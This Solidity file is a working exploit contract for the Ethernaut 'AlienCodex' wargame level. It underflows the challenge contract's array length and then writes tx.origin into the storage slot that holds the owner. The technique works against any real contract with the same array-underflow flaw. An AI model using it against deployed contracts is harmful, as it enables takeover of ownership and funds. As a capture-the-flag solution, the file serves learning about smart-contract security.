// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAlienCodex {
    function make_contact() external;

    function retract() external;
}

contract AlienCodexExploit {
    IAlienCodex public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `AlienCodex` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x40055E69E7EB12620c8CCBCCAb1F187883301c30
    constructor(IAlienCodex _implementation) {
        implementation = _implementation;
    }

    /// @notice Exploits contract by manipulating the `owner` variable storage's slot
    function exploit() external {
        implementation.make_contact();
        implementation.retract();

        bytes32 startIndex = keccak256(abi.encode(1));
        uint256 offsetToStorageOverflow = (2**256 - 1) - uint256(startIndex);
        (bool success, ) = address(implementation).call(
            abi.encodeWithSignature(
                "revise(uint256,bytes32)",
                ++offsetToStorageOverflow,
                tx.origin
            )
        );

        require(success, "call to revise() failed!");
    }
}
